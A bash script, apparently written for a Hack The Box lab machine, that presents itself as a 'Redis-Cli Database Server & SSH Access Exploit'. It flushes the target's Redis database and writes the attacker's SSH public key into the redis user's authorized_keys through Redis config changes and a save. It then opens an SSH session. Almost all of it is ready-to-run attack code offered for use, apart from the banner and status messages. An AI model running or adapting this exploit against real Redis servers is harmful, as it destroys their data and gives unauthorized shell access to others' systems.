#!/bin/bash

sleep 2

echo  "\n\e[00;34mx================================================x\e[00m"  
echo  "\e[00;34mx\e[00m" "\e[00;97mRedis-Cli Database Server & SSH Access Exploit\e[00m" "\e[00;34mx\e[00m"
echo  "\e[00;34mx================================================x\e[00m"
echo  "\e[00;31m  Developed by Ezploisite | 2019 \e[00m"
echo  "\e[00;31m  Only for educational purpose \e[00m"
echo  "\e[00;31m  To KNX and my Team \e[00m"
echo  "\e[00;31m  Starting soon... \e[00m\n"

sleep 2

echo  "\n\e[00;34mx================================================x\e[00m"  
echo  "\e[00;34mx\e[00m" "\e[00;97m                Initializing                  \e[00m" "\e[00;34mx\e[00m"
echo  "\e[00;34mx================================================x\e[00m"
echo ""
echo ""

sleep 1

(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt


value=$( redis-cli -h 10.10.10.160 flushall )
if [ $value = OK ]
then
  echo "\e[00;92m[+]\e[00m Database Flushed!"
else
  echo "\e[00;91m[-] Database Error:\e[00m\n"
fi

value2=$( cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit )
if [ $value2 = OK ]
then
  echo "\e[00;92m[+]\e[00m File Imported Correctly!"
else
  echo "\e[00;91m[-] Database Error:\e[00m\n"
fi

value3=$( redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh/ )
if [ $value3 = OK ]
then
  echo "\e[00;92m[+]\e[00m Switching Correct Directory"
else
  echo "\e[00;91m[-] Database Error:\e[00m\n"
fi

value4=$( redis-cli -h 10.10.10.160 config set dbfilename "authorized_keys" )
if [ $value4 = OK ]
then
  echo "\e[00;92m[+]\e[00m Saving id_rsa"
else
  echo "\e[00;91m[-] Database Error:\e[00m\n"
fi


#redis-cli -h 10.10.10.160 config get dbfilename
echo "\e[00;92m[+]\e[00m Key Seems Correctly Overwrite!"


value6=$( redis-cli -h 10.10.10.160 save )
if [ $value6 = OK ]
then
  echo "\e[00;92m[+]\e[00m Database Configurations Saved!"
else
  echo "\e[00;91m[-] Database not saved:\e[00m\n"
fi

sleep 1
echo "[+] You Maybe Will Get SSH Access In A While"


ssh -i /root/.ssh/id_rsa redis@10.10.10.160

